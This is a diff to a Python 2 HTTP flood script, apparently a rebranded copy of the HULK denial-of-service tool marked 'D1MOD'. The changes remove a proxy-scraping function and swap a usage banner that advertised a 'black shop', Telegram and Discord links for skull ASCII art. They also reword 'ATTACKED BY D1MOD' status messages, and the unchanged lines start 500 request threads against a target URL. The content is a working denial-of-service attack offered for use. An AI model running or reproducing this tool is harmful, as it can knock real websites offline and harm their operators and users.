@@ -42,24 +42,6 @@ def useragent_list():
 	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
 	return(headers_useragents)
 
-
-#genarate proxy
-import requests
-import traceback
-
-def get_proxies():
-    url = 'https://sslproxies.org/'
-    response = requests.get(url)
-    parser = fromstring(response.text)
-    proxies = set()
-    for i in parser.xpath('//tbody/tr')[:10]:
-        if i.xpath('.//td[7][contains(text(),"yes")]'):
-            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
-            proxies.add(proxy)
-    return proxies
-
-
-
 # generates a referer array
 def referer_list():
 	global headers_referers
@@ -78,15 +60,25 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
-	print 'USAGE : python2 D1MOD.py <url>'
-        print 'BLACK SHOP : https://d1modshop.ml'
-        print 'TELEGRAM CHANNEL : https://t.me/the_dead_team'
-	print 'TELEGRAM GROUP : https://t.me/the_dead_team2'
-	print 'DISCORD SERVER : https://discord.gg/hn7epsef4Z'
-	print '---------------------------------------------------'
+	print '.=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-.'
+	print '|                     ______                     |'
+	print '|                  .-"      "-.                  |'
+	print '|                 /            \                 |'
+	print '|     _          |              |          _     |'
+	print '|    ( \         |,  .-.  .-.  ,|         / )    |'
+	print '|     > "=._     | )(__/  \__)( |     _.=" <     |'
+	print '|    (_/"=._"=._ |/     /\     \| _.="_.="\_)    |'
+	print '|           "=._"(_     ^^     _)"_.="           |'
+	print '|               "=\__|IIIIII|__/="               |'
+	print '|              _.="| \IIIIII/ |"=._              |'
+	print '|    _     _.="_.="\          /"=._"=._     _    |'
+	print '|   ( \_.="_.="     `--------`     "=._"=._/ )   |'
+	print '|    > _.="                            "=._ <    |'
+	print '|   (_/           MADE BY D1MOD18          \_)   |'
+	print '|           https://discord.gg/hn7epsef4Z        |'
+	print '|               https://d1modshop.ml             |'
+	print ''-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=''
 
-	
 #http request
 def httpcall(url):
 	useragent_list()
@@ -109,7 +101,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Response Code 500'
+			print '--> ATTACKED BY D1MOD <--'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -137,10 +129,10 @@ class MonitorThread(threading.Thread):
 		previous=request_counter
 		while flag==0:
 			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d ATTACKED BY D1MOD1877 -->  " % (request_counter)
+				print "%d D1MOD ATTACKED THE SERVER -->" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- D1MOD Attack FINISHED --"
+			print "\n-- D1MOD Attack Finished --"
 
 #execute 
 if len(sys.argv) < 2:
@@ -151,7 +143,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- D1MOD ATTACK STARTED --"
+		print "-- HULK Attack Started --"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
@@ -163,13 +155,5 @@ else:
 		for i in range(500):
 			t = HTTPThread()
 			t.start()
-		t = MonitorThread()
-		t.start()
-		t = MonitorThread()
-		t.start()
-		t = MonitorThread()
-		t.start()
-		t = MonitorThread()
-		t.start()
 		t = MonitorThread()
 		t.start()
